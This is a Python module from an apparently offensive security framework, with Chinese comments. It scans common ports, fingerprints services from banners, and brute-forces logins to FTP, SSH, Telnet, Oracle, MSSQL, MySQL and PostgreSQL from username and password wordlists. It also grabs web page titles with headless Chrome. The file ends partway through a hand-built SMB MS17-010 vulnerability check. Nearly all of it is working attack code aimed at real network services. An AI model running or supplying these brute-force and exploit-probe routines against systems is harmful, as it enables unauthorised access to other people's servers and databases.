from lib.util.fun import parse_url,prepare_ajp_forward_request
from lib.util.fun import ssh_login,ftp_login,mysql_login,mssql_login,oracle_login,telnet_login,postgresql_login
from lib.util.output import Output,ExpRequest
from lib.clasetting import color
import lib.util.globalvar as GlobalVar
import prettytable as pt
import concurrent.futures
import random
import re
import socket
import datetime

THREADNUM = 100  # 端口爆破线程数
BruteTHREADNUM = 10  #口令爆破线程数

_dict = [
    'ftp',
    'ssh',
    'telnet',
    'mssql',
    'oracle',
    'mysql',
    'postgresql',
    'mongodb',
    'smb',
    'rdp',
    ]
#字典初始化
Userdict = {}
Passwords = {}
for name in _dict:
    with open('dict/'+'%s_username_dic.txt'%name, mode='r', encoding='utf-8') as f:
        Userdict[name] = [line.strip() for line in f.readlines()]
    with open('dict/'+'%s_password_dic.txt'%name, mode='r', encoding='utf-8') as f:
        Passwords[name] = [line.strip() for line in f.readlines()]
PORTS = [
    21,22,23,25,53,68,69,80,81,
    135,139,143,161,443,445,465,489,512,513,514,873,888,993,995,
    1080,1099,1352,1433,1521,1723,2082,2083,2181,2222,2375,2604,
    3306,3312,3389,3690,4440,4848,5432,5632,5900,5984,6082,6379,
    7001,7778,8000,8009,8080,8888,8089,8291,9000,9001,9200,
    10050,11211,27017,50050,50070,
]
# 添加端口段
# PORTS.extend([i for i in range(80, 90)])
# PORTS.extend([i for i in range(800, 900)])
# PORTS.extend([i for i in range(8000, 9000)])
# PORTS.extend([i for i in range(10000, 11000)])
# PORTS = list(set(PORTS))

PROBE = {'GET / HTTP/1.0\r\n\r\n'}

SIGNS = (
    # 协议 | 版本 | 关键字
    b'SMB|SMB|^\0\0\0.\xffSMBr\0\0\0\0.*',
    b'SMB|SMB|^\x83\x00\x00\x01\x8f',
    b"Xmpp|Xmpp|^\<\?xml version='1.0'\?\>",
    b'Netbios|Netbios|^\x79\x08.*BROWSE',
    b'Netbios|Netbios|^\x79\x08.\x00\x00\x00\x00',
    b'Netbios|Netbios|^\x05\x00\x0d\x03',
    b'Netbios|Netbios|^\x82\x00\x00\x00',
    b'Netbios|Netbios|\x83\x00\x00\x01\x8f',
    b'backdoor|backdoor|^500 Not Loged in',
    b'backdoor|backdoor|GET: command',
    b'backdoor|backdoor|sh: GET:',
    b'bachdoor|bachdoor|[a-z]*sh: .* command not found',
    b'backdoor|backdoor|^bash[$#]',
    b'backdoor|backdoor|^sh[$#]',
    b'backdoor|backdoor|^Microsoft Windows',
    b'DB2|DB2|.*SQLDB2RA',
    b'Finger|Finger|^\r\n	Line	  User',
    b'Finger|Finger|Line	 User',
    b'Finger|Finger|Login name: ',
    b'Finger|Finger|Login.*Name.*TTY.*Idle',
    b'Finger|Finger|^No one logged on',
    b'Finger|Finger|^\r\nWelcome',
    b'Finger|Finger|^finger:',
    b'Finger|Finger|^must provide username',
    b'Finger|Finger|finger: GET: ',
    b'FTP|FTP|^220.*\n331',
    b'FTP|FTP|^220.*\n530',
    b'FTP|FTP|^220.*FTP',
    b'FTP|FTP|^220 .* Microsoft .* FTP',
    b'FTP|FTP|^220 Inactivity timer',
    b'FTP|FTP|^220 .* UserGate',
    b'FTP|FTP|^220.*FileZilla Server',
    b'LDAP|LDAP|^\x30\x0c\x02\x01\x01\x61',
    b'LDAP|LDAP|^\x30\x32\x02\x01',
    b'LDAP|LDAP|^\x30\x33\x02\x01',
    b'LDAP|LDAP|^\x30\x38\x02\x01',
    b'LDAP|LDAP|^\x30\x84',
    b'LDAP|LDAP|^\x30\x45',
    b'RDP|RDP|^\x00\x01\x00.*?\r\n\r\n$',
    b'RDP|RDP|^\x03\x00\x00\x0b',
    b'RDP|RDP|^\x03\x00\x00\x11',
    b'RDP|RDP|^\x03\0\0\x0b\x06\xd0\0\0\x12.\0$',
    b'RDP|RDP|^\x03\0\0\x17\x08\x02\0\0Z~\0\x0b\x05\x05@\x06\0\x08\x91J\0\x02X$',
    b'RDP|RDP|^\x03\0\0\x11\x08\x02..}\x08\x03\0\0\xdf\x14\x01\x01$',
    b'RDP|RDP|^\x03\0\0\x0b\x06\xd0\0\0\x03.\0$',
    b'RDP|RDP|^\x03\0\0\x0b\x06\xd0\0\0\0\0\0',
    b'RDP|RDP|^\x03\0\0\x0e\t\xd0\0\0\0[\x02\xa1]\0\xc0\x01\n$',
    b'RDP|RDP|^\x03\0\0\x0b\x06\xd0\0\x004\x12\0',
    b'RDP-proxy|RDP-proxy|^nmproxy: Procotol byte is not 8\n$',
    b'Msrpc|Msrpc|^\x05\x00\x0d\x03\x10\x00\x00\x00\x18\x00\x00\x00\x00\x00',
    b'Msrpc|Msrpc|\x05\0\r\x03\x10\0\0\0\x18\0\0\0....\x04\0\x01\x05\0\0\0\0$',
    b'Mssql|Mssql|^\x05\x6e\x00',
    b'Mssql|Mssql|^\x04\x01',
    b'Mssql|Mssql|;MSSQLSERVER;',
    b'MySQL|MySQL|mysql_native_password',
    b'MySQL|MySQL|^\x19\x00\x00\x00\x0a',
    b'MySQL|MySQL|^\x2c\x00\x00\x00\x0a',
    b'MySQL|MySQL|hhost \'',
    b'MySQL|MySQL|khost \'',
    b'MySQL|MySQL|mysqladmin',
    b'MySQL|MySQL|whost \'',
    b'MySQL|MySQL|^[.*]\x00\x00\x00\n.*?\x00',
    b'MySQL|MySQL|this MySQL server',
    b'MySQL|MySQL|MariaDB server',
    b'MySQL|MySQL|\x00\x00\x00\xffj\x04Host',
    b'db2jds|db2jds|^N\x00',
    b'Nagiosd|Nagiosd|Sorry, you \(.*are not among the allowed hosts...',
    b'Nessus|Nessus|< NTP 1.2 >\x0aUser:',
    b'oracle-tns-listener|\(ERROR_STACK=\(ERROR=\(CODE=',
    b'oracle-tns-listener|\(ADDRESS=\(PROTOCOL=',
    b'oracle-dbSNMP|^\x00\x0c\x00\x00\x04\x00\x00\x00\x00',
    b'oracle-https|^220- ora',
    b'RMI|RMI|\x00\x00\x00\x76\x49\x6e\x76\x61',
    b'RMI|RMI|^\x4e\x00\x09',
    b'PostgreSQL|PostgreSQL|Invalid packet length',
    b'PostgreSQL|PostgreSQL|^EFATAL',
    b'rpc-nfs|rpc-nfs|^\x02\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00',
    b'RPC|RPC|\x01\x86\xa0',
    b'RPC|RPC|\x03\x9b\x65\x42\x00\x00\x00\x01',
    b'RPC|RPC|^\x80\x00\x00',
    b'Rsync|Rsync|^@RSYNCD:',
    b'Rsync|Rsync|@RSYNCD:',
    b'smux|smux|^\x41\x01\x02\x00',
    b'snmp-public|snmp-public|\x70\x75\x62\x6c\x69\x63\xa2',
    b'SNMP|SNMP|\x41\x01\x02',
    b'Socks|Socks|^\x05[\x00-\x08]\x00',
    b'SSL|SSL|^..\x04\0.\0\x02',
    b'SSL|SSL|^\x16\x03\x01..\x02...\x03\x01',
    b'SSL|SSL|^\x16\x03\0..\x02...\x03\0',
    b'SSL|SSL|SSL.*GET_CLIENT_HELLO',
    b'SSL|SSL|^-ERR .*tls_start_servertls',
    b'SSL|SSL|^\x16\x03\0\0J\x02\0\0F\x03\0',
    b'SSL|SSL|^\x16\x03\0..\x02\0\0F\x03\0',
    b'SSL|SSL|^\x15\x03\0\0\x02\x02\.*',
    b'SSL|SSL|^\x16\x03\x01..\x02...\x03\x01',
    b'SSL|SSL|^\x16\x03\0..\x02...\x03\0',
    b'Sybase|Sybase|^\x04\x01\x00',
    b'Telnet|Telnet|Telnet',
    b'Telnet|Telnet|^\xff[\xfa-\xff]',
    b'Telnet|Telnet|^\r\n%connection closed by remote host!\x00$',
    b'Rlogin|Rlogin|login: ',
    b'Rlogin|Rlogin|rlogind: ',
    b'Rlogin|Rlogin|^\x01\x50\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e\x20\x64\x65\x6e\x69\x65\x64\x2e\x0a',
    b'TFTP|TFTP|^\x00[\x03\x05]\x00',
    b'UUCP|UUCP|^login: password: ',
    b'VNC|VNC|^RFB',
    b'IMAP|IMAP|^\* OK.*?IMAP',
    b'POP|POP|^\+OK.*?',
    b'SMTP|SMTP|^220.*?SMTP',
    b'Kangle|Kangle|HTTP.*kangle',
    b'SMTP|SMTP|^554 SMTP',
    b'FTP|FTP|^220-',
    b'FTP|FTP|^220.*?FTP',
    b'FTP|FTP|^220.*?FileZilla',
    b'SSH|SSH|^SSH-',
    b'SSH|SSH|connection refused by remote host.',
    b'RTSP|RTSP|^RTSP/',
    b'SIP|SIP|^SIP/',
    b'NNTP|NNTP|^200 NNTP',
    b'SCCP|SCCP|^\x01\x00\x00\x00$',
    b'Webmin|Webmin|.*MiniServ',
    b'Webmin|Webmin|^0\.0\.0\.0:.*:[0-9]',
    b'websphere-javaw|websphere-javaw|^\x15\x00\x00\x00\x02\x02\x0a',
    b'Mongodb|Mongodb|MongoDB',
    b'Squid|Squid|X-Squid-Error',
    b'Mssql|Mssql|MSSQLSERVER',
    b'Vmware|Vmware|VMware',
    b'ISCSI|ISCSI|\x00\x02\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
    b'Redis|Redis|^-ERR unknown command',
    b'Redis|Redis|^-ERR wrong number of arguments',
    b'Redis|Redis|^-DENIED Redis is running',
    b'MemCache|MemCache|^ERROR\r\n',
    b'WebSocket|WebSocket|Server: WebSocket',
    b'SVN|SVN|^\( success \( 2 2 \( \) \( edit-pipeline svndiff1',
    b'Dubbo|Dubbo|^Unsupported command',
    b'HTTP|Elasticsearch|cluster_name.*elasticsearch',
    b'RabbitMQ|RabbitMQ|^AMQP\x00\x00\t\x01',
    b'Pyspider|Pyspider|HTTP.*Dashboard - pyspider',
    b'HTTPS|HTTPS|Instead use the HTTPS scheme to access',
    b'HTTPS|HTTPS|HTTP request was sent to HTTPS',
    b'HTTPS|HTTPS|HTTP request to an HTTPS server',
    b'HTTPS|HTTPS|Location: https',
    b'HTTP|HTTP|HTTP/1.1',
    b'HTTP|HTTP|HTTP/1.0',
    b'Zookeeper|Zookeeper|^Zookeeper version: ')

def get_server(port):
    SERVER = {
        '21': 'FTP',
        '22': 'SSH',
        '23': 'Telnet',
        '25': 'SMTP',
        '53': 'DNS',
        '68': 'DHCP',
        '8080': 'HTTP',
        '69': 'TFTP',
        '995': 'POP3',
        '135': 'RPC',
        '139': 'NetBIOS',
        '143': 'IMAP',
        '443': 'HTTPS',
        '161': 'SNMP',
        '489': 'LDAP',
        '445': 'SMB',
        '465': 'SMTPS',
        '512': 'Linux R RPE',
        '513': 'Linux R RLT',
        '514': 'Linux R cmd',
        '873': 'Rsync',
        '888': '宝塔',
        '993': 'IMAPS',
        '1080': 'proxy',
        '1099': 'JavaRMI',
        '1352': 'Lotus',
        '1433': 'MSSQL',
        '1521': 'Oracle',
        '1723': 'PPTP',
        '2082': 'CPanel',
        '2083': 'CPanel',
        '2181': 'Zookeeper',
        '2222': 'DircetAdmin',
        '2375': 'Docker',
        '2604': 'Zebra',
        '3306': 'MySQL',
        '3312': 'Kangle',
        '3389': 'RDP',
        '3690': 'SVN',
        '4440': 'Rundeck',
        '4848': 'GlassFish',
        '5432': 'PostgreSql',
        '5632': 'PcAnywhere',
        '5900': 'VNC',
        '5984': 'CouchDB',
        '6082': 'varnish',
        '6379': 'Redis',
        '8009': 'Ajp',
        '8888': '宝塔',
        '9000': 'FastCgi',
        '9001': 'Weblogic',
        '7778': 'Kloxo',
        '10050': 'Zabbix',
        '8291': 'RouterOS',
        '9200': 'Elasticsearch',
        '11211': 'Memcached',
        '27017': 'MongoDB',
        '50050': 'CServer',
        '50070': 'Hadoop'
    }

    for k, v in SERVER.items():
        if k == port:
            return v
    return 'Unknown'

class ScanPort:
    def __init__(self, ipaddr):
        self.ipaddr = ipaddr
        self.port = []
        self.out = []
        self.num = 0

    def regex(self, response, port):
        match = False

        if re.search(b'<title>502 Bad Gateway', response):
            return match

        for pattern in SIGNS:
            pattern = pattern.split(b'|')
            if re.search(pattern[-1], response, re.IGNORECASE):
                text = response.decode('utf-8', 'ignore')
                match = True
                proto = {"server": pattern[1].decode(), "port": port, "banner": text}
                self.out.append(proto)
                break
        if not match:
            proto = {"server": get_server(port), "port": port, "banner": response.decode('utf-8', 'ignore')}
            self.out.append(proto)

    def socket_scan(self, hosts):
        global PROBE
        response = ''
        socket.setdefaulttimeout(2)
        ip, port = hosts.split(':')
        try:
            # 这里是统计总共开放端口，有些服务器一扫描就全端口开放当大于某个端口数量时则不记录
            if len(self.port) < 30:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((ip, int(port)))
                # 建立3次握手成功
                if result == 0:
                    try:
                        for i in PROBE:
                            sock.sendall(i.encode())
                            response = sock.recv(256)
                            sock.close()
                            # 发送payload 获取响应 来判断服务
                            if response:
                                self.regex(response, port)
                            else:
                                proto = {"server": get_server(port), "port": port, "banner": ''}
                                self.out.append(proto)
                            break
                    except socket.timeout:
                        proto = {"server": get_server(port), "port": port, "banner": ''}
                        self.out.append(proto)

                    self.port.append(port)
            else:
                self.num = 1
        except (socket.timeout, ConnectionResetError, OSError):
            pass
        except Exception as e:
            # traceback.print_exc(e)
            print(e)

    def run(self, ip):
        hosts = []
        global PORTS, THREADNUM
        random.shuffle(PORTS)
        for i in PORTS:
            hosts.append('{}:{}'.format(ip, i))
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=THREADNUM) as executor:
                result = {executor.submit(self.socket_scan, i): i for i in hosts}
                # 每个函数限制执行时间为3
                for future in concurrent.futures.as_completed(result, timeout=3):
                    future.result()
                    if self.num == 1:
                        break
        except (EOFError, concurrent.futures._base.TimeoutError):
            pass

    def pool(self):
        out = []
        try:
            self.run(self.ipaddr)
        except Exception as e:
            pass

        if self.num == 0:
            #self.save(self.ipaddr, self.out)
            for _ in self.out:
                out.append('{}:{}'.format(_.get('server'), _.get('port')))
                #print('PortScan', self.ipaddr, '{}:{}\n'.format(_.get('server'), _.get('port')))
            return out
        else:
            #self.save(self.ipaddr, [{"server": 'Portspoof', "port": '0', "banner": ''}])
            #print('PortScan', self.ipaddr, 'Portspoof:0\n')
            return ['Portspoof:0']

class PortBrute():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = parse_url(env.get('url'))
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))

    def brute_ftp(self, port=21):
        appName = 'PortBrute'
        pocname = 'brute_ftp'
        hosts = []
        out = []
        index = 0
        for user in Userdict['ftp']:
            for passwd in Passwords['ftp']:
                hosts.append('{}:{}:{}:{}:{}'.format(self.url, str(port), user, passwd, str(self.timeout)))
        #输出类
        output = Output(self.url, appName, pocname)
        #开始执行模块
        now = datetime.datetime.now()
        color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] Start", 'orange')
        try:
            if self.vuln == 'False':
                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=BruteTHREADNUM) as executor:
                        for result in executor.map(ftp_login, hosts):
                            if result == True:
                                out.append(hosts[index])
                                break
                            index += 1
                            now = datetime.datetime.now()
                            color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] "+str(index)+'/'+str(len(hosts)), 'orange')
                        # result = {executor.submit(ssh_login, i): i for i in hosts}
                        # # 每个函数限制执行时间为3
                        # for future in concurrent.futures.as_completed(result, timeout=3):
                        #     out.append(future.result())
                except (EOFError, concurrent.futures._base.TimeoutError):
                    pass
                except Exception:
                    pass
                if len(out) != 0:
                    # 入库
                    return output.no_echo_success(', '.join(out))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
            
    def brute_ssh(self, port=22):
        appName = 'PortBrute'
        pocname = 'brute_ssh'
        hosts = []
        out = []
        index = 0
        for user in Userdict['ssh']:
            for passwd in Passwords['ssh']:
                hosts.append('{}:{}:{}:{}:{}'.format(self.url, str(port), user, passwd, str(self.timeout)))
        #输出类
        output = Output(self.url, appName, pocname)
        #开始执行模块
        now = datetime.datetime.now()
        color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] Start", 'orange')
        try:
            if self.vuln == 'False':
                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                        for result in executor.map(ssh_login, hosts):
                            if result == True:
                                out.append(hosts[index])
                                break
                            index += 1
                            now = datetime.datetime.now()
                            color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] "+str(index)+'/'+str(len(hosts)), 'orange')
                        # result = {executor.submit(ssh_login, i): i for i in hosts}
                        # # 每个函数限制执行时间为3
                        # for future in concurrent.futures.as_completed(result, timeout=3):
                        #     out.append(future.result())
                except (EOFError, concurrent.futures._base.TimeoutError):
                    pass
                except Exception:
                    pass
                if len(out) != 0:
                    # 入库
                    return output.no_echo_success(', '.join(out))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))

    def brute_telnet(self, port=23):
        appName = 'PortBrute'
        pocname = 'brute_telnet'
        hosts = []
        out = []
        index = 0
        for user in Userdict['telnet']:
            for passwd in Passwords['telnet']:
                hosts.append('{}:{}:{}:{}:{}'.format(self.url, str(port), user, passwd, str(self.timeout)))
        #输出类
        output = Output(self.url, appName, pocname)
        #开始执行模块
        now = datetime.datetime.now()
        color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] Start", 'orange')
        try:
            if self.vuln == 'False':
                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                        for result in executor.map(telnet_login, hosts):
                            if result == True:
                                out.append(hosts[index])
                                break
                            index += 1
                            now = datetime.datetime.now()
                            color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] "+str(index)+'/'+str(len(hosts)), 'orange')
                        # result = {executor.submit(ssh_login, i): i for i in hosts}
                        # # 每个函数限制执行时间为3
                        # for future in concurrent.futures.as_completed(result, timeout=3):
                        #     out.append(future.result())
                except (EOFError, concurrent.futures._base.TimeoutError):
                    pass
                except Exception:
                    pass
                if len(out) != 0:
                    # 入库
                    return output.no_echo_success(', '.join(out))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))

    def brute_oracle(self, port=1521):
        appName = 'PortBrute'
        pocname = 'brute_oracle'
        hosts = []
        out = []
        index = 0
        for user in Userdict['oracle']:
            for passwd in Passwords['oracle']:
                hosts.append('{}:{}:{}:{}:{}'.format(self.url, str(port), user, passwd, str(self.timeout)))
        #输出类
        output = Output(self.url, appName, pocname)
        #开始执行模块
        now = datetime.datetime.now()
        color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] Start", 'orange')
        try:
            if self.vuln == 'False':
                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=BruteTHREADNUM) as executor:
                        for result in executor.map(oracle_login, hosts):
                            if result == True:
                                out.append(hosts[index])
                                break
                            index += 1
                            now = datetime.datetime.now()
                            color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] "+str(index)+'/'+str(len(hosts)), 'orange')
                        # result = {executor.submit(ssh_login, i): i for i in hosts}
                        # # 每个函数限制执行时间为3
                        # for future in concurrent.futures.as_completed(result, timeout=3):
                        #     out.append(future.result())
                except (EOFError, concurrent.futures._base.TimeoutError):
                    pass
                except Exception:
                    pass
                if len(out) != 0:
                    # 入库
                    return output.no_echo_success(', '.join(out))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))

    def brute_mssql(self, port=1433):
        appName = 'PortBrute'
        pocname = 'brute_mssql'
        hosts = []
        out = []
        index = 0
        for user in Userdict['mssql']:
            for passwd in Passwords['mssql']:
                hosts.append('{}:{}:{}:{}:{}'.format(self.url, str(port), user, passwd, str(self.timeout)))
        #输出类
        output = Output(self.url, appName, pocname)
        #开始执行模块
        now = datetime.datetime.now()
        color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] Start", 'orange')
        try:
            if self.vuln == 'False':
                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=BruteTHREADNUM) as executor:
                        for result in executor.map(mssql_login, hosts):
                            if result == True:
                                out.append(hosts[index])
                                break
                            index += 1
                            now = datetime.datetime.now()
                            color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] "+str(index)+'/'+str(len(hosts)), 'orange')
                        # result = {executor.submit(ssh_login, i): i for i in hosts}
                        # # 每个函数限制执行时间为3
                        # for future in concurrent.futures.as_completed(result, timeout=3):
                        #     out.append(future.result())
                except (EOFError, concurrent.futures._base.TimeoutError):
                    pass
                except Exception:
                    pass
                if len(out) != 0:
                    # 入库
                    return output.no_echo_success(', '.join(out))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))

    def brute_mysql(self, port=3306):
        appName = 'PortBrute'
        pocname = 'brute_mysql'
        hosts = []
        out = []
        index = 0
        for user in Userdict['mysql']:
            for passwd in Passwords['mysql']:
                hosts.append('{}:{}:{}:{}:{}'.format(self.url, str(port), user, passwd, str(self.timeout)))
        #输出类
        output = Output(self.url, appName, pocname)
        #开始执行模块
        now = datetime.datetime.now()
        color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] Start", 'orange')
        try:
            if self.vuln == 'False':
                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=BruteTHREADNUM) as executor:
                        for result in executor.map(mysql_login, hosts):
                            if result == True:
                                out.append(hosts[index])
                                break
                            index += 1
                            now = datetime.datetime.now()
                            color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] "+str(index)+'/'+str(len(hosts)), 'orange')
                        # result = {executor.submit(ssh_login, i): i for i in hosts}
                        # # 每个函数限制执行时间为3
                        # for future in concurrent.futures.as_completed(result, timeout=3):
                        #     out.append(future.result())
                except (EOFError, concurrent.futures._base.TimeoutError):
                    pass
                except Exception:
                    pass
                if len(out) != 0:
                    # 入库
                    return output.no_echo_success(', '.join(out))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))

    def brute_postgresql(self, port=5432):
        appName = 'PortBrute'
        pocname = 'brute_postgresql'
        hosts = []
        out = []
        index = 0
        for user in Userdict['postgresql']:
            for passwd in Passwords['postgresql']:
                hosts.append('{}:{}:{}:{}:{}'.format(self.url, str(port), user, passwd, str(self.timeout)))
        #输出类
        output = Output(self.url, appName, pocname)
        #开始执行模块
        now = datetime.datetime.now()
        color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] Start", 'orange')
        try:
            if self.vuln == 'False':
                try:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=BruteTHREADNUM) as executor:
                        for result in executor.map(postgresql_login, hosts):
                            if result == True:
                                out.append(hosts[index])
                                break
                            index += 1
                            now = datetime.datetime.now()
                            color("["+str(now)[11:19]+"] " + "[*] The " + self.url + " is running"+" ["+ pocname +"] "+str(index)+'/'+str(len(hosts)), 'orange')
                        # result = {executor.submit(ssh_login, i): i for i in hosts}
                        # # 每个函数限制执行时间为3
                        # for future in concurrent.futures.as_completed(result, timeout=3):
                        #     out.append(future.result())
                except (EOFError, concurrent.futures._base.TimeoutError):
                    pass
                except Exception:
                    pass
                if len(out) != 0:
                    # 入库
                    return output.no_echo_success(', '.join(out))
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
            
    def http_or_https_get_title(self, port=80, server='HTTP'):
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        import os
        appName = 'PortBrute'
        pocname = 'http_or_https_get_title'
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        try:
            #_verify
            if self.vuln == 'False':
                if server == 'HTTPS':
                    url = 'https://'+self.url+':'+str(port)
                else:
                    url = 'http://'+self.url+':'+str(port)
                options = Options()
                # 隐藏浏览器
                options.add_argument("--headless")
                # 控制走代理
                if os.environ['HTTP_PROXY'] != '':
                    options.add_argument('--proxy-server={0}'.format(os.environ['HTTP_PROXY']))
                # 自定义chromedriver路径
                driver = webdriver.Chrome("C:\Program Files\Google\Chrome\Application\chromedriver.exe", options=options)
                driver.set_page_load_timeout(10)
                driver.get(url)
                # r = exprequest.get(
                #     url=url, 
                #     headers=headers, 
                #     retry_time=self.retry_time,
                #     retry_interval=self.retry_interval,
                #     timeout=self.timeout,
                # )
                # print(r.text)
                now = datetime.datetime.now()
                color ("["+str(now)[11:19]+"] " + "[+] The " + self.url + " is "+ pocname +" "+ server +":"+str(port)+" "+ "[title: "+driver.title+" ] ", 'green')
                driver.quit()
            #_attack
            else:
                pass
        except Exception as error:
            return output.error_output(str(error))

    def smb_MS17010(self, port=445):
        import struct
        appName = 'PortBrute'
        pocname = 'smb_MS17010'
        method = 'socks'
        #数据
        payload = "\x00\x00\x00\x54"  # Session Message
        payload += "\xff\x53\x4d\x42"  # Server Component: SMB
        payload += "\x72"  # SMB Command: Negotiate Protocol (0x72)
        payload += "\x00"  # Error Class: Success (0x00)
        payload += "\x00"  # Reserved
        payload += "\x00\x00"  # Error Code: No Error
        payload += "\x18"  # Flags
        payload += "\x01\x28"  # Flags 2
        payload += "\x00\x00"  # Process ID High 0
        payload += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
        payload += "\x00\x00"  # Reserved
        payload += "\x00\x00"  # Tree id 0
        payload += "\x44\x6d"  # Process ID 27972
        payload += "\x00\x00"  # User ID 0
        payload += "\x42\xc1"  # Multiplex ID 49474
        payload += "\x00"  # WCT 0
        payload += "\x31\x00"  # BCC 49
        payload += "\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"  # LANMAN1.0
        payload += "\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00"  # LM1.2X002
        payload += "\x02\x4e\x54\x20\x4c\x41\x4e\x4d\x41\x4e\x20\x31\x2e\x30\x00"  # NT LANMAN 1.0
        payload += "\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"  # NT LM 0.12
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((self.url, port))
                s.send(bytes(payload,'utf8'))
                try:
                    while True:
                        data = s.recv(1024)
                        # Get Native OS from Session Setup AndX Response
                        if data[8:10] == "\x73\x00":
                            nativeos = data[45:100].split(b'\x00' * 1)[0]
                        if data[8:10] == "\x25\x05":
                            if data[9:13] == "\x05\x02\x00\xc0":
                                return output.no_echo_success(method)
                            
                        if data[8:10] == "\x72\x00":
                            packetsession = "\xff\x53\x4d\x42"  # Server Component: SMB
                            packetsession += "\x73"  # SMB Command: Session Setup AndX (0x73)
                            packetsession += "\x00"  # Error Class: Success (0x00)
                            packetsession += "\x00"  # Reserved
                            packetsession += "\x00\x00"  # Error Code: No Error
                            packetsession += "\x18"  # Flags
                            packetsession += "\x01\x28"  # Flags 2
                            packetsession += "\x00\x00"  # Process ID High 0
                            packetsession += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
                            packetsession += "\x00\x00"  # Reserved
                            packetsession += data[28:34]  # TID+PID+UID
                            packetsession += "\x42\xc1"  # Multiplex ID 49474
                            packetsession += "\x0d"  # WCT 0
                            packetsession += "\xff"  # AndXCommand: No further commands (0xff)
                            packetsession += "\x00"  # Reserved 00
                            packetsession += "\x00\x00"  # AndXOffset: 0
                            packetsession += "\xdf\xff"  # Max Buffer: 65503
                            packetsession += "\x02\x00"  # Max Mpx Count: 2
                            packetsession += "\x01\x00"  # VC Number: 1
                            packetsession += "\x00\x00\x00\x00"  # Session Key: 0x00000000
                            packetsession += "\x00\x00"  # ANSI Password Length: 0
                            packetsession += "\x00\x00"  # Unicode Password Length: 0
                            packetsession += "\x00\x00\x00\x00"  # Reserved: 00000000
                            packetsession += "\x40\x00\x00\x00"  # Capabilities: 0x00000040, NT Status Codes
                            packetsession += "\x26\x00"  # Byte Count (BCC): 38
                            packetsession += "\x00"  # Account:
                            packetsession += "\x2e\x00"  # Primary Domain: .
                            packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00"  # Native OS: Windows 2000 2195
                            packetsession += "\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00"  # Native LAN Manager: Windows 2000 5.0    
                        
                            da = struct.pack(">i", len(packetsession)) + bytes(packetsession)
                        
                        ## Tree Connect AndX Request, Path: \\ip\IPC$
                        if data[8:10] == "\x73\x00":
                            share = "\xff\x53\x4d\x42"  # Server Component: SMB
                            share += "\x75"  # SMB Command: Tree Connect AndX (0x75)
                            share += "\x00"  # Error Class: Success (0x00)
                            share += "\x00"  # Reserved
                            share += "\x00\x00"  # Error Code: No Error
                            share += "\x18"  # Flags
                            share += "\x01\x28"  # Flags 2
                            share += "\x00\x00"  # Process ID High 0
                            share += "\x00\x00\x00\x00\x00\x00\x00\x00"  # Signature
                            share += "\x00\x00"  # Reserved
                            share += data[28:34]  # TID+PID+UID
                            share += "\x42\xc1"  # Multiplex ID 49474
                            share += "\x04"  # WCT 4
                            share += "\xff"  # AndXCommand: No further commands (0xff)
                            share += "\x00"  # Reserved: 00
                            share += "\x00\x00"  # AndXOffset: 0
                            share += "\x00\x00"  # Flags: 0x0000
                            share += "\x01\x00"  # Password Length: 1
                            share += "\x19\x00"  # Byte Count (BCC): 25
                            share += "\x00"  # Password: 00
